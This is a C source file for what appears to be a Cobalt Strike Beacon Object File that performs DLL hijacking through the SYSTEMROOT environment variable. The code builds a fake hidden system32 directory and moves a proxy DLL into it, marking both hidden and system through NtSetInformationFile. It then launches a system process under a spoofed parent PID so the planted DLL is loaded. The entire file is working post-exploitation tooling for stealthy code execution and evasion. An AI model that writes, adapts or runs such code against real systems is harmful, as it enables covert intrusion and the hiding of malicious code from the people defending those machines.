#include <windows.h>
#include <stdio.h>
#include "dllenvhijacking.h"
#include "beacon.h"



BOOL CreateHiddenDir(WCHAR *directory) {
	DWORD attrib;
	
	if(KERNEL32$CreateDirectoryW(directory, NULL) == 0) {
		if(KERNEL32$GetLastError() == 183) BeaconPrintf(CALLBACK_ERROR, "Failed to create directory: ERROR_ALREADY_EXISTS\n");
		if(KERNEL32$GetLastError() == 3) BeaconPrintf(CALLBACK_ERROR, "Failed to create directory: ERROR_PATH_NOT_FOUND\n");
		return FALSE;
	}
		
	attrib = KERNEL32$GetFileAttributesW(directory);
	if(attrib == INVALID_FILE_ATTRIBUTES) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to retrieve file attribute information from directory with error code: %ld\n", KERNEL32$GetLastError());
		return FALSE;
	}
	attrib |= FILE_ATTRIBUTE_HIDDEN;
	attrib |= FILE_ATTRIBUTE_SYSTEM;

	if(KERNEL32$SetFileAttributesW(directory, attrib) == 0) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to set new attribute information on the directory with error code: %ld\n", KERNEL32$GetLastError());
		return FALSE;
	}
	return TRUE;
}


BOOL CreateHiddenFile(WCHAR *file) {
	HANDLE hFile;
	FILE_BASIC_INFORMATION fileInfo;
	IO_STATUS_BLOCK ioStatusBlock;
	

	NtQueryInformationFile_t pNtQueryInformationFile = (NtQueryInformationFile_t)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryInformationFile");
	if(pNtQueryInformationFile == NULL) return 0;

    NtSetInformationFile_t pNtSetInformationFile = (NtSetInformationFile_t)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtSetInformationFile");
	if(pNtSetInformationFile == NULL) return 0;


	hFile = KERNEL32$CreateFileW(file, GENERIC_READ | GENERIC_WRITE | FILE_WRITE_ATTRIBUTES, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		BeaconPrintf(CALLBACK_ERROR, "Could not open file with error code: %ld\n", KERNEL32$GetLastError());
		return FALSE;
	}

	if (pNtQueryInformationFile(hFile, &ioStatusBlock, &fileInfo, sizeof(FILE_BASIC_INFORMATION), FileBasicInformation) < 0) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to get file attribute information with error code: %ld\n", KERNEL32$GetLastError());
		KERNEL32$CloseHandle(hFile);
		return FALSE;
	}
	
	fileInfo.FileAttributes |= FILE_ATTRIBUTE_HIDDEN;
	fileInfo.FileAttributes |= FILE_ATTRIBUTE_SYSTEM;
	

	if (pNtSetInformationFile(hFile, &ioStatusBlock, &fileInfo, sizeof(FILE_BASIC_INFORMATION), FileBasicInformation) < 0) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to set new attribute information on the file with error code: %ld\n", KERNEL32$GetLastError());
		KERNEL32$CloseHandle(hFile);
		return FALSE;
	}

	KERNEL32$CloseHandle(hFile);
	return TRUE;
}


BOOL MoveDLL(WCHAR *dllSrcPath, WCHAR *dllDstPath) {
	if (KERNEL32$MoveFileW(dllSrcPath, dllDstPath) == 0) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to move %ls with error code: %ld\n", dllSrcPath, KERNEL32$GetLastError());
		return FALSE; 
	}

	return TRUE;
}


BOOL RunProc(WCHAR *sysrootPath, char *targetProcPath, int pid) {
	STARTUPINFOEX info = { sizeof(info) };
    PROCESS_INFORMATION processInfo;
	SIZE_T cbAttributeListSize = 0;
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
	HANDLE hParentProcess = NULL;
	BOOL setEnvSuccess = TRUE;
	
	if (KERNEL32$SetEnvironmentVariableW(L"SYSTEMROOT", sysrootPath) == 0) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to set the new environment variable!\n");
		return FALSE; 
	}
	
	KERNEL32$InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize); 
	pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, cbAttributeListSize);
	KERNEL32$InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize);

	hParentProcess = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	KERNEL32$UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);
	info.lpAttributeList = pAttributeList;
	
	if (KERNEL32$CreateProcessA(NULL, targetProcPath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &info.StartupInfo, &processInfo) == 0) {
		setEnvSuccess = FALSE;
	}
	
	if (KERNEL32$SetEnvironmentVariableW(L"SYSTEMROOT", L"C:\\Windows\\") == 0) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to reset the old environment variable!\n");
	}

	KERNEL32$DeleteProcThreadAttributeList(pAttributeList);
	KERNEL32$CloseHandle(hParentProcess);
	KERNEL32$CloseHandle(processInfo.hProcess);
	KERNEL32$CloseHandle(processInfo.hThread);

	return setEnvSuccess;
}


int go(char *args, int len) {
	WCHAR wsys32[] = L"system32\\";
	char sys32[] = "C:\\windows\\system32\\";
	WCHAR newSys32Path[100]; 
	WCHAR dllDstPath[100]; 
	WCHAR dllSrcPath[100]; 
	char targetProcPath[100];
	WCHAR *sysrootPath; 
	WCHAR *proxyDll; 
	WCHAR *inputDllSrcPath; 
	char *targetProc; 
	int *pid; 
	BOOL res = FALSE;
	datap parser;
	
	BeaconDataParse(&parser, args, len);
	sysrootPath = BeaconDataExtract(&parser, NULL);
	proxyDll = BeaconDataExtract(&parser, NULL);
	inputDllSrcPath = BeaconDataExtract(&parser, NULL);
	targetProc = BeaconDataExtract(&parser, NULL);
	pid = BeaconDataInt(&parser);
	

	res = CreateHiddenDir(sysrootPath);
	if (!res) return 0;
	else {
		res = FALSE;
	}

	MSVCRT$wcscpy(newSys32Path, sysrootPath);
	MSVCRT$wcscat(newSys32Path, wsys32);
	res = CreateHiddenDir(newSys32Path);
	if (!res) return 0;
	else {
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Created new directory structure %ls as systemfile + hidden\n", newSys32Path);
		res = FALSE;
	}
	
	MSVCRT$wcscpy(dllDstPath, newSys32Path);
	MSVCRT$wcscat(dllDstPath, proxyDll);
	MSVCRT$wcscpy(dllSrcPath, inputDllSrcPath);
	MSVCRT$wcscat(dllSrcPath, proxyDll);
	res = MoveDLL(dllSrcPath, dllDstPath);
	if (!res) return 0;
	else {
		res = FALSE;
	}
	
	res = CreateHiddenFile(dllDstPath);
	if (!res) return 0;
	else {
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Moved DLL to location %ls and made it a systemfile + hidden\n", dllDstPath);
		res = FALSE;
	}
	
	MSVCRT$strcpy(targetProcPath, sys32);
	MSVCRT$strcat(targetProcPath, targetProc);
	res = RunProc(sysrootPath, targetProcPath, pid);
	if (!res) BeaconPrintf(CALLBACK_ERROR, "Failed to start process %s as a spoofed child from PID: %d\n", targetProcPath, pid);
	else {
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Modified SYSTEMROOT environment variable to %ls and executed the DLL as a spoofed process of PID: %d\n",sysrootPath, pid);
	}
	
	return 0;
}









